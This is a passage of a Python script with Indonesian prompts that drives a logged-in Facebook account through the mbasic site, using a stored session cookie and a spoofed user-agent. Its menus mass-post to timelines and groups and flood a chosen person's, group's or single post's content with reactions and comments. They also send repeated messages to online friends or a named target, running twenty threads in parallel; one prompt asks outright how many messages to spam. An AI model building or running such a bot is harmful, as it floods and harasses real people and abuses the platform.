          file=input(f"{er}Put your image format : {rgb}png/jpg\n{pr}{ab} >>> {rgb}")
          try:
              image=open(file,"rb").read()
          except FileNotFoundError:
              exit(f"{er}Image Not Found")
          if "png" in file.split(".")[1]:
             ty="image/png"
          else:
             ty="image/jpeg"
          text=input(f"{er}Use separator , to make post with random text.\n{pr}Caption : {rgb}")
          if "," in text:
             text=text.split(",")
          else:
             text=text
          print(f"{ab}-----------------------------------------------")
          with ThreadPoolExecutor(max_workers=20) as ex:
               for i in range(jum):
                   ex.submit(post_image,(mbasic.format("/me")),(text),(file),(image),(ty),("timeline"))
          print()
          print(f"{ab}-----------------------------------------------")
          cblg()
       else:
          text=input(f"{er}Use separator , to make post with random text.\n{pr}Caption : {rgb}")
          if "," in text:
             text=text.split(",")
          else:
             text=text
          print(f"{ab}-----------------------------------------------")
          with ThreadPoolExecutor(max_workers=20) as ex:
               for i in range(jum):
                   ex.submit(post_no_image,(mbasic.format("/me")),(text))
          print()
          print(f"{ab}-----------------------------------------------")
          cblg()
    elif choice == "02" or choice == "2":
       user=input(f"{er}Put username/id group\n{pr}{ab} >>> {rgb}")
       try:
          jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
          exit(f"{er}Masukin jumlah post nya coeg")
       ph=input(f"{pr}Add image to post? ({rgb}Y{W}/{rgb}N{W}) : {rgb}")
       if ph == "y" or ph == "Y":
          file=input(f"{er}Put your image format : {rgb}png/jpg\n{pr}{ab} >>> {rgb}")
          try:
              image=open(file,"rb").read()
          except FileNotFoundError:
              exit(f"{er}Image Not Found")
          if "png" in file.split(".")[1]:
             ty="image/png"
          else:
             ty="image/jpeg"
          text=input(f"{er}Use separator , to make post with random text.\n{pr}Caption : {rgb}")
          if "," in text:
             text=text.split(",")
          else:
             text=text
          print(f"{ab}-----------------------------------------------")
          with ThreadPoolExecutor(max_workers=20) as ex:
               for i in range(jum):
                   ex.submit(post_image,(mbasic.format("/groups/"+user+"/")),(text),(file),(image),(ty),("group"))
          print()
          print(f"{ab}-----------------------------------------------")
          cblg()
       else:
          text=input(f"{er}Use separator , to make post with random text.\n{pr}Caption : {rgb}")
          if "," in text:
             text=text.split(",")
          else:
             text=text
          print(f"{ab}-----------------------------------------------")
          with ThreadPoolExecutor(max_workers=20) as ex:
               for i in range(jum):
                   ex.submit(post_no_image,(mbasic.format("/groups/"+user+"/")),(text))
          print()
          print(f"{ab}-----------------------------------------------")
          cblg()
    else:
       print(f"{er}Pilih yg bener coeg")
       pilih_auto_post()

def pilih_react():
    choice=input(f"{pr}Select : {rgb}")
    if choice == "00" or choice == "0":
      menu()
    elif choice == "01" or choice == "1":
      ty=rtype()
      user=input(f"{er}Put username/id poeple\n{pr} {ab}>>> {rgb}")
      if user.isdigit():
         user="/profile.php?id="+user+"&v=timeline"
      else:
         user="/"+user+"?v=timeline"
      print(f"\r{gd}Getting Data...",end="")
      usr=dump_post(ses,cokie,mbasic.format(user),"react","Lihat Berita Lain")
      print(f"\r{fr}Total  : {rgb}{len(usr)}                         ",end="")
      print()
      try:
          jum=int(input(f"{pr}Count  : {rgb}"))
      except ValueError:
          exit(f"{er}Masukin jumlah yang mau di reactnya coeg")
      print(f"{ab}-----------------------------------------------")
      with ThreadPoolExecutor(max_workers=20) as ex:
          for x in usr[:jum]:
              ex.submit(react,(mbasic.format(x)),(ty))
      print()
      print(f"{ab}-----------------------------------------------")
      cblg()
    elif choice == "02" or choice == "2":
      ty=rtype()
      print(f"\r{gd}Getting Data...",end="")
      usr=dump_post(requests,cokie,mbasic.format("/home.php"),"react","Lihat Berita Lain")
      print(f"\r{fr}Total  : {rgb}{len(usr)}                          ",end="")
      print()
      try:
          jum=int(input(f"{pr}Count  : {rgb}"))
      except ValueError:
          exit(f"{er}Masukin jumlah yg mau di reactnya coeg")
      print(f"{ab}-----------------------------------------------")
      with ThreadPoolExecutor(max_workers=20) as ex:
          for x in usr[:jum]:
              ex.submit(react,(mbasic.format(x)),(ty))
      print()
      print(f"{ab}-----------------------------------------------")
      cblg()
    elif choice == "03" or choice == "3":
      ty=rtype()
      user=input(f"{er}Put your username/id group\n{pr} {ab}>>> {rgb}")
      print(f"\r{gd}Getting Data...",end="")
      usr=dump_post(ses,cokie,mbasic.format("/groups/"+user+"/"),"react","Lihat Postingan Lainnya")
      print(f"\r{fr}Total  : {rgb}{len(usr)}                       ",end="")
      print()
      try:
          jum=int(input(f"{pr}Count  : {rgb}"))
      except ValueError:
          exit(f"{er}Masukin jumlah yang mau di reactnya coeg")
      print(f"{ab}-----------------------------------------------")
      with ThreadPoolExecutor(max_workers=20) as ex:
          for x in usr[:jum]:
              ex.submit(react,(mbasic.format(x)),(ty))
      print()
      print(f"{ab}-----------------------------------------------")
      cblg()
    else:
        print(f"{er}Pilih yg bener coeg")
        pilih_react()

def pilih_komen():
    choice=input(f"{pr}Select : {rgb}")
    if choice == "00" or choice == "0":
       menu()
    elif choice == "01" or choice == "1":
       user=input(f"{er}Put username/id people\n{pr} {ab}>>> {rgb}")
       if user.isdigit():
          user="/profile.php?id="+user+"&v=timeline"
       else:
          user="/"+user+"?v=timeline"
       print(f"\r{gd}Getting Data...",end="")
       usr=dump_post(ses,cokie,mbasic.format(user),"komen","Lihat Berita Lain")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                       ",end="")
       print()
       try:
           jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
           exit(f"{er}Masukin jumlah post yg mau di komen nya coeg")
       ph=input(f"{pr}Add image to comment? ({rgb}Y{W}/{rgb}N{W}) : {rgb}")
       if ph == "y" or ph == "Y":
          file=input(f"{er}Put your image format : {rgb}png/jpg\n{pr}{ab} >>> {rgb}")
          try:
              image=open(file,"rb").read()
          except FileNotFoundError:
              exit(f"{er}Image Not Found")
          if "png" in file.split(".")[1]:
              ty="image/png"
          else:
              ty="image/jpeg"
          text=input(f"{er}Use separator , for comments with random text.\n{pr}Comment Text : {rgb}")
          if "," in text:
             text=text.split(",")
          else:
             text=text
          print(f"{ab}-----------------------------------------------")
          with ThreadPoolExecutor(max_workers=20) as ex:
               for x in usr[:jum]:
                   ex.submit(komen_image,(mbasic.format(x)),(text),(file),(image),(ty))
          print()
          print(f"{ab}-----------------------------------------------")
          cblg()
       else:
          text=input(f"{er}Use separator , for comments with random text.\n{pr}Comment Text : {rgb}")
          if "," in text:
             text=text.split(",")
          else:
             text=text
          print(f"{ab}-----------------------------------------------")
          with ThreadPoolExecutor(max_workers=20) as ex:
               for x in usr[:jum]:
                   ex.submit(komen_no_image,(mbasic.format(x)),(text))
          print()
          print(f"{ab}-----------------------------------------------")
          cblg()
    elif choice == "02" or choice == "2":
       print(f"\r{gd}Getting Data...",end="")
       usr=dump_post(requests,cokie,mbasic.format("/home.php"),"komen","Lihat Berita Lain")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                         ",end="")
       print()
       try:
           jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
           exit(f"{er}Masukin jumlah post yg mau di komen nya coeg")
       ph=input(f"{pr}Add image to comment? ({rgb}Y{W}/{rgb}N{W}) : {rgb}")
       if ph == "y" or ph == "Y":
          file=input(f"{er}Put your image format : {rgb}png/jpg\n{pr}{ab} >>> {rgb}")
          try:
              image=open(file,"rb").read()
          except FileNotFoundError:
              exit(f"{er}Image Not Found")
          if "png" in file.split(".")[1]:
              ty="image/png"
          else:
              ty="image/jpeg"
          text=input(f"{er}Use separator , for comments with random text.\n{pr}Comment Text : {rgb}")
          if "," in text:
             text=text.split(",")
          else:
             text=text
          print(f"{ab}-----------------------------------------------")
          with ThreadPoolExecutor(max_workers=20) as ex:
               for x in usr[:jum]:
                   ex.submit(komen_image,(mbasic.format(x)),(text),(file),(image),(ty))
          print()
          print(f"{ab}-----------------------------------------------")
          cblg()
       else:
          text=input(f"{er}Use separator , for comments with random text.\n{pr}Comment Text : {rgb}")
          if "," in text:
             text=text.split(",")
          else:
             text=text
          print(f"{ab}-----------------------------------------------")
          with ThreadPoolExecutor(max_workers=20) as ex:
               for x in usr[:jum]:
                   ex.submit(komen_no_image,(mbasic.format(x)),(text))
          print()
          print(f"{ab}-----------------------------------------------")
          cblg()
    elif choice == "03" or choice == "3":
       user=input(f"{er}Put username/id group\n{pr} {ab}>>> {rgb}")
       print(f"\r{gd}Getting Data...",end="")
       usr=dump_post(ses,cokie,mbasic.format("/groups/"+user+"/"),"komen","Lihat Postingan Lainnya")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                           ",end="")
       print()
       try:
           jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
           exit(f"{er}Masukin jumlah post yg mau di komen nya coeg")
       ph=input(f"{pr}Add image to comment? ({rgb}Y{W}/{rgb}N{W}) : {rgb}")
       if ph == "y" or ph == "Y":
          file=input(f"{er}Put your image format : {rgb}png/jpg\n{pr}{ab} >>> {rgb}")
          try:
              image=open(file,"rb").read()
          except FileNotFoundError:
              exit(f"{er}Image Not Found")
          if "png" in file.split(".")[1]:
              ty="image/png"
          else:
              ty="image/jpeg"
          text=input(f"{er}Use separator , for comments with random text.\n{pr}Comment Text : {rgb}")
          if "," in text:
             text=text.split(",")
          else:
             text=text
          print(f"{ab}-----------------------------------------------")
          with ThreadPoolExecutor(max_workers=20) as ex:
               for x in usr[:jum]:
                   ex.submit(komen_image,(x),(text),(file),(image),(ty))
          print()
          print(f"{ab}-----------------------------------------------")
          cblg()
       else:
          text=input(f"{er}Use separator , for comments with random text.\n{pr}Comment Text : {rgb}")
          if "," in text:
             text=text.split(",")
          else:
             text=text
          print(f"{ab}-----------------------------------------------")
          with ThreadPoolExecutor(max_workers=20) as ex:
               for x in usr[:jum]:
                   ex.submit(komen_no_image,(mbasic.format(x)),(text))
          print()
          print(f"{ab}-----------------------------------------------")
          cblg()
    elif choice == "04" or choice == "4":
       user=input(f"{er}Put url post target\n{pr}{ab} >>> {rgb}")
       if "www.facebook" in user:
          user=user.replace("www.facebook","mbasic.facebook")
       elif "m.facebook" in user:
          user=user.replace("m.facebook","mbasic.facebook")
       else:
          user=user
       try:
          jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
          exit(f"{er}Masukin jumlah komen nya coeg")
       ph=input(f"{pr}Add image to comment? ({rgb}Y{W}/{rgb}N{W}) : {rgb}")
       if ph == "y" or ph == "Y":
          file=input(f"{er}Put your image format : {rgb}png/jpg\n{pr}{ab} >>> {rgb}")
          try:
              image=open(file,"rb").read()
          except FileNotFoundError:
              exit(f"{er}Image Not Found")
          if "png" in file.split(".")[1]:
              ty="image/png"
          else:
              ty="image/jpeg"
          text=input(f"{er}Use separator , for comments with random text.\n{pr}Comment Text : {rgb}")
          if "," in text:
             text=text.split(",")
          else:
             text=text
          print(f"{ab}-----------------------------------------------")
          with ThreadPoolExecutor(max_workers=20) as ex:
               for i in range(jum):
                   ex.submit(komen_image,(user),(text),(file),(image),(ty))
          print()
          print(f"{ab}-----------------------------------------------")
          cblg()
       else:
          text=input(f"{er}Use separator , for comments with random text.\n{pr}Comment Text : {rgb}")
          if "," in text:
             text=text.split(",")
          else:
             text=text
          print(f"{ab}-----------------------------------------------")
          with ThreadPoolExecutor(max_workers=20) as ex:
               for i in range(jum):
                   ex.submit(komen_no_image,(user),(text))
          print()
          print(f"{ab}-----------------------------------------------")
          cblg()
    else:
       print(f"{er}Pilih yg bener coeg")
       pilih_komen()

def pilih_message():
    choice=input(f"{pr}Select : {rgb}")
    if choice == "00" or choice == "0":
       menu()
    elif choice == "01" or choice == "1":
       print(f"\r{gd}Getting Data...",end="")
       usr=people(ses,cokie,mbasic.format("/buddylist.php"),"temanonline")
       print(f"\r{fr}Total  : {rgb}{len(usr)}                         ",end="")
       print()
       text=input(f"{er}Use separator , for message with random text.\n{pr}Message : {rgb}")
       if "," in text:
          text=text.split(",")
       else:
          text=text
       try:
          jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
          exit(f"{er}Masukin jumlah yg mau di spam nya coeg")
       print(f"{ab}-----------------------------------------------")
       with ThreadPoolExecutor(max_workers=20) as ex:
             for x in usr[:jum]:
                 ex.submit(kirim_pesan,(mbasic.format("/profile.php?id="+x)),(text))
       print()
       print(f"{ab}-----------------------------------------------")
       cblg()
    elif choice == "02" or choice == "2":
       user=input(f"{er}Put username/id people\n{pr}{ab} >>> {rgb}")
       if user.isdigit():
          user="/profile.php?id="+user
       else:
          user="/"+user
       text=input(f"{er}Use separator , for message with random text.\n{pr}Message : {rgb}")
       if "," in text:
          text=text.split(",")
       else:
          text=text
       try:
          jum=int(input(f"{pr}Count  : {rgb}"))
       except ValueError:
          exit(f"{er}Masukin jumlah pesan nya coeg")
       print(f"{ab}-----------------------------------------------")
       with ThreadPoolExecutor(max_workers=20) as ex:
          for _ in range(jum):
             ex.submit(kirim_pesan,(mbasic.format(user)),(text))
       print()
       print(f"{ab}-----------------------------------------------")
       cblg()
    else:
       print(f"{er}Pilih yg bener coeg")
       pilih_message()

def rtype():
    baner()
    userinfo()
    print(f"{rgb}01{ab}. {W}like\n{rgb}02{ab}. {W}love\n{rgb}03{ab}. {W}care\n{rgb}04{ab}. {W}Haha\n{rgb}05{ab}. {W}wow\n{rgb}06{ab}. {W}sad\n{rgb}07{ab}. {W}angry\n{rgb}00{ab}. {W}back")
    print(f"{ab}-----------------------------------------------")
    return pilih_type_react()

def pilih_type_react():
    choice=input(f"{pr}Select : {rgb}")
    if choice == "00" or choice == "0":
       spam_react()
    elif choice == "01" or choice == "1":
       return "reaction_type=1&"
    elif choice == "02" or choice == "2":
       return "reaction_type=2&"
    elif choice == "03" or choice == "3":
       return "reaction_type=16&"
    elif choice == "04" or choice == "4":
       return "reaction_type=4&"
    elif choice == "05" or choice == "5":
       return "reaction_type=3&"
    elif choice == "06" or choice == "6":
       return "reaction_type=7&"
    elif choice == "07" or choice == "7":
       return "reaction_type=8&"
    else:
       print(f"{er}Pilih yg bener coeg")
       pilih_type_react()
if __name__=="__main__":
   baner()
   ua="Mozilla/5.0 (Linux; Android 10; Redmi 4A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.186 Mobile Safari/537.36"
   ses=requests.Session()
   ses.headers.update({"Host":"mbasic.facebook.com","cache-control":"max-age=0","upgrade-insecure-requests":"1","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3","referer":"https://mbasic.facebook.com/","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"})
   try:
       log=login()
       name=log["name"]
       id=log["id"]
       cokie={"cookie":log["cookie"]}
       menu()
   except Exception as e:
       print(f"{er}{e}")

